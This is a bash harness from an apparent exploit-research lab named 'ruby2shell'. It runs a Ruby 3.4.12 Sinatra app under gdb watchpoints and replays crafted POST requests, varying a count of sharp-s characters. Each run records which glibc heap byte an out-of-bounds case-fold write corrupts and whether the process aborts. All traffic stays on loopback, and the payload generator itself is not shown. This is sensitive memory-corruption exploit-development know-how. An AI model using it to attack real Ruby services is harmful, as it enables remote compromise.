#!/bin/bash
# W381: map the wire-chosen sharp-s count to the glibc byte the fold's single
# out-of-bounds write lands on, and replay two requests for the odd counts that
# write. Unmodified plain 3.4.12 Sinatra app, hardware WRITE watchpoints only.
#
# Usage (all paths relative to the repository root):
#   bash lab/repro/ruby2shell-w381-sizeword-sweep.sh one 4800 lab/build/evidence/casemap-chain/w381/replay-one
#   bash lab/repro/ruby2shell-w381-sizeword-sweep.sh two 4810 lab/build/evidence/casemap-chain/w381/replay-two
#
# The caller supplies a block of free loopback ports (one mode uses 7, two
# mode uses 4) and a gitignored output directory. No debugger writes, no
# preload, no request-path middleware; all listeners bind to 127.0.0.1.
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-}" FIRSTPORT="${2:-}" OUT="${3:-}"
case "$MODE" in
  one) counts=(22 23 24 25 26 27 28); requests=1; narms=7 ;;
  two) counts=(23 25 27 27); requests=2; narms=4 ;;
  *) echo "usage: $0 one|two FIRSTPORT OUTDIR" >&2; exit 2 ;;
esac
case "$FIRSTPORT" in ''|*[!0-9]*) echo "FIRSTPORT must be a port number" >&2; exit 2 ;; esac
[ -n "$OUT" ] || { echo "OUTDIR required" >&2; exit 2; }
mkdir -p "$OUT" || exit 1
SUMMARY="$OUT/summary.txt"
: > "$SUMMARY"

GDBSCRIPT="$PWD/lab/repro/ruby2shell-w379-wire-watch.gdb"
VGEMS="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
VBIN="$PWD/lab/build/plain/ruby-3.4.12-plain/bin/ruby"
APP="$PWD/lab/repro/ruby2shell-stock-baseline.ru"
WIRE="$PWD/lab/repro/ruby2shell-w371-wire.py"

arm() {
  local tag="$1" port="$2" n="$3" req="$4"
  local out="$OUT/$tag.gdb.out" wire="$OUT/$tag.wire"
  local gdbpid child ready=NO alive=NO abort=NO
  # Refuse an occupied port: a stale server makes curl readiness succeed while
  # the intended Sinatra process has already exited with EADDRINUSE.
  if ss -ltn 2>/dev/null | grep -qE "[:.]$port[[:space:]]"; then
    echo "port $port busy; arm $tag SKIPPED" | tee -a "$SUMMARY"
    return 2
  fi
  echo "== START $tag N=$n requests=$req port=$port $(date -u +%H:%M:%SZ)"
  export GEM_PATH="$VGEMS${GEM_PATH:+:$GEM_PATH}"
  export RUBY2SHELL_STOCK_PORT="$port"
  setsid gdb -q -batch -x "$GDBSCRIPT" --args "$VBIN" "$APP" > "$out" 2>&1 &
  gdbpid=$!
  for _ in $(seq 1 240); do
    child=$(pgrep -P "$gdbpid" | head -1)
    if curl -s -m 1 "http://127.0.0.1:$port/" >/dev/null 2>&1; then ready=YES; break; fi
    sleep 0.25
  done
  if [ "$ready" = YES ]; then
    RUBY2SHELL_W371_SURFACES=method-postfield-size RUBY2SHELL_W377_POSTLEN=64 \
    RUBY2SHELL_W378_COUNT="$req" RUBY2SHELL_W380_COUNT="$n" \
    RUBY2SHELL_W376_RESPONSE=1 \
      python3 "$WIRE" "$port" POST > "$wire" 2>&1
    sleep 2
    if kill -0 "$child" 2>/dev/null; then alive=YES; fi
  fi
  if grep -qiE 'corrupted size|malloc_printerr|SIGABRT|Aborted' "$out"; then abort=YES; fi
  kill -TERM "$child" 2>/dev/null
  for _ in $(seq 1 60); do kill -0 "$gdbpid" 2>/dev/null || break; sleep 0.1; done
  kill -KILL "$gdbpid" 2>/dev/null
  wait "$gdbpid" 2>/dev/null
  {
    echo "== $tag N=$n requests=$req port=$port ready=$ready alive=$alive abort=$abort"
    grep -E '^W379CALL' "$out" | cut -c1-150 || true
    grep -E '^W379TRAP' "$out" | cut -c1-90 || true
    grep -E '^W379SUMMARY' "$out" || true
    grep -E '^surface=.*(head|response-len)' "$wire" | cut -c1-120 || true
    grep -iE 'corrupted size vs|malloc_printerr|unlink_chunk|SIGABRT' "$out" | head -3 || true
  } >> "$SUMMARY"
  echo "== $tag ready=$ready alive=$alive abort=$abort"
}

i=0
for n in "${counts[@]}"; do
  tag="$MODE-n$n-$i"
  arm "$tag" "$((FIRSTPORT+i))" "$n" "$requests"
  i=$((i+1))
done
[ "$i" -eq "$narms" ] || { echo "expected $narms arms, ran $i" | tee -a "$SUMMARY"; exit 2; }
cat "$SUMMARY"
